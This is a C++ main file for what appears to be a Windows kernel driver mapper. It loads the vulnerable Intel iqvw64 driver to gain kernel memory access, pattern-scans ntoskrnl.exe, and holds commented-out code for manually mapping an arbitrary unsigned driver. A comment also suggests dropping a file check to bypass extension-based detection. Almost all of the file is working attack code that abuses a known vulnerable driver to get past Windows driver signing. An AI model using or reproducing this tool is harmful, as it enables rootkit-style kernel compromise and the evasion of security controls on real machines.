#include <Windows.h>
#include <filesystem>
#include <print>

#include <utils/fs_utils.hpp>

#include <kernel/kernel_context.hpp>
#include <vuln/drivers/iqvw64_driver.hpp>
#include <vuln/vuln_driver_loader.hpp>

#include <scanner/pattern_scanner.hpp>

#include <mapper/driver_mapper.hpp>

int main(int argc, char** argv)
{
    if (!EnableLoadPrivilege()) {
        std::println("[-] Failed to allow load privileges");
        return 1;
    }

    // if (argc != 2) {
    //     std::println("Usage: {} <driver_path>", argv[0]);
    //     return 1;
    // }

    // std::filesystem::path driverPath = argv[1];
    // if (!std::filesystem::exists(driverPath)) {
    //     std::println("[-] File '{}' doesn't exist", driverPath.stem().string());
    //     return 1;
    // }

    ///*
    //    You can remove this check if you want to accept any file type
    //    (e.g. to bypass extension-based detection)
    //*/
    // if (driverPath.extension() != ".sys") {
    //    std::println("[-] File must have a .sys extension");
    //    return 1;
    //}

    // const auto driverBytes = Utils::FS::ReadBytesFromFile(driverPath);
    // if (driverBytes.empty()) {
    //     std::println("[-] Failed to read bytes from driver");
    //     return 1;
    // }

    std::shared_ptr<Iqvw64Driver> iqvw64 = std::make_shared<Iqvw64Driver>("\\\\.\\Nal");
    VulnDriverLoader vulnDrvLoader = VulnDriverLoader(iqvw64);

    if (!vulnDrvLoader.Load()) {
        std::println("[-] Failed to load vulnerable driver");
        return 1;
    }

    std::println("[+] Vulnerable driver successfully loaded");

    K32Context k32ctx(iqvw64);

    uintptr_t ntBase = k32ctx.GetK32ModuleAddr("ntoskrnl.exe");
    size_t ntSize = k32ctx.GetK32ModuleSize("ntoskrnl.exe");

    const char pattern[] = "\x48\x8D\x0D\x00\x00\x00\x00\x45\x33\xF6\x48\x89\x44\x24";
    const char mask[] = "xxx????xxxxxxx";

    uintptr_t addr = k32ctx.GetPatternScanner().FindPatternAddr(ntBase, ntSize, pattern, mask);
    std::println("{:X}", addr);

    /*DriverMapper mapper(&k32ctx);

    bool isMapped = mapper.Map((void*)driverBytes.data());
    std::println("[~] Driver mmap status: {}", isMapped);*/

    if (!vulnDrvLoader.Unload()) {
        std::println("[-] Failed to unload vulnerable driver");
        return 1;
    }

    std::println("[+] Vulnerable driver successfully unloaded");
    return 0;
}